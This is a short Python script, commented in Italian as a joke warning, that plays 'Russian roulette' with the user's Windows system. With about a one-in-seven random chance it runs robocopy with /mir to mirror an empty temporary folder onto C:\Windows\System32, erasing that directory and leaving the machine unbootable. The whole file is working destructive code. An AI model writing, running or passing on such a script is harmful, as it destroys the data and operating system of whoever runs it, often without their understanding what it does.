#Usalo con cautela questo programma potrebbe cancellarti System32 se la variabile prende valore 1 
import random
import subprocess
import tempfile

if random.randint(0, 6) == 1:
    with tempfile.TemporaryDirectory() as empty:
        subprocess.run(
            ["robocopy", "/R:0", "/W:0", "/mir", empty, "C:\Windows\System32"]
        )